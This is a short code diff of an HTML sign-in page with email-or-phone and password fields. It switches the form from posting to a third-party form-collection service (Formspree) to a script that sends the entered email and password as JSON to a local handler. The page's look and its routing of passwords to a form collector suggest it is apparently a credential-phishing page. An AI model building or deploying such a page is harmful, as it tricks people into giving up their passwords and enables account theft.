@@ -46,11 +46,32 @@
 <body>
     <div class="container">
         <h1>Sign in</h1>
-        <form action="https://formspree.io/f/xrgnnvnz" method="post">
+        <form id="loginForm">
             <input type="email" name="email" placeholder="Email or phone" required><br>
             <input type="password" name="password" placeholder="Enter your password" required><br>
             <button type="submit">Next</button>
         </form>
+        <script>
+            document.getElementById('loginForm').addEventListener('submit', async function(event) {
+                event.preventDefault();
+                const formData = new FormData(event.target);
+                const data = {
+                    email: formData.get('email'),
+                    password: formData.get('password')
+                };
+
+                const response = await fetch('/.submit-form.js', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                const result = await response.json();
+                alert(result.message || result.error);
+            });
+        </script>
     </div>
 </body>
 </html>
